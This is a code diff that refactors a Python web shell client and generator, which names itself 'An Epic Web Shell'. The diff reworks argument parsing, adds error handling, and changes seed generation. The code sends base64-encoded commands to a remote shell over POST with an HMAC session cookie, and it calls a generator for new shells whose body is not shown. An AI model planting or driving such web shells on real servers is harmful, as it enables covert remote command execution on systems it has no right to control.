@@ -1,22 +1,7 @@
 #!/usr/bin/env python3
-import argparse
+import argparse, random, bcrypt, requests, os, sys, string
 from termcolor import colored
 from base64 import b64encode
-import random
-import bcrypt
-import requests
-import os
-import sys
-
-def parse_options():
-
-	formatter = lambda prog: argparse.HelpFormatter(prog,max_help_position=50)
-	parser = argparse.ArgumentParser(description='An Epic Web Shell - cwinfosec', formatter_class=formatter)
-	parser.add_argument("-c", "--connect", dest="connect", type=str, help="URL of web shell to connect to", required=False)
-	parser.add_argument("-k", "--key", dest="key", type=str, help="Auth key for the generated web shell", required=False)
-	parser.add_argument("-g", "--generate", dest="generate", help="Generate new key and webshell", action="store_true", required=False)
-	args = parser.parse_args()
-	return args
 
 def generate_key(seed):
 
@@ -62,27 +47,32 @@ def connect(url, hmac):
 				os.system('clear')
 			except:
 				os.system('cls')
-		r = requests.post(url, data=b64encode(cmd.encode("ascii")), headers={'Cookie':'session=' + hmac}, verify=False)
-		print(r.text)
+		#Error handling if issue posting
+		try:
+			r = requests.post(url, data=b64encode(cmd.encode("ascii")), headers={'Cookie':'session=' + hmac}, verify=False)
+			print(r.text)
+		except (requests.ConnectionError, requests.HTTPError, requests.Timeout) as err:
+			print(err)
+       
 
 def main(args):
-
 	if args.connect:
-
 		url = args.connect
 		hmac = args.key
 		connect(url, hmac)
 
 	if args.generate:
-
-		chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ01234567890!@#$%^&*()-=_+[]{};":,./<>?'
-		seed = ''.join(random.choice(chars) for i in range(50))
+		seed = ''.join(random.choice(string.ascii_uppercase + string.digits + string.ascii_lowercase + string.punctuation) for _ in range(50))
 		print(colored('[+] ', 'blue') + 'Seed: ' + seed)
 		key = generate_key(seed)
 		print(colored('[+] ', 'blue') + 'Key: %s' % key)
 		generate_shell(key)
 
-if __name__ in "__main__":
-
-	args = parse_options()
+if __name__ == "__main__":
+	formatter = lambda prog: argparse.HelpFormatter(prog,max_help_position=50)
+	parser = argparse.ArgumentParser(description='An Epic Web Shell - cwinfosec',formatter_class=formatter)
+	parser.add_argument("-c", "--connect", dest="connect", type=str, help="URL of web shell to connect to", required=False)
+	parser.add_argument("-k", "--key", dest="key", type=str, help="Auth key for the generated web shell", required=False)
+	parser.add_argument("-g", "--generate", dest="generate", help="Generate new key and webshell", action="store_true", required=False)
+	args = parser.parse_args()
 	main(args)
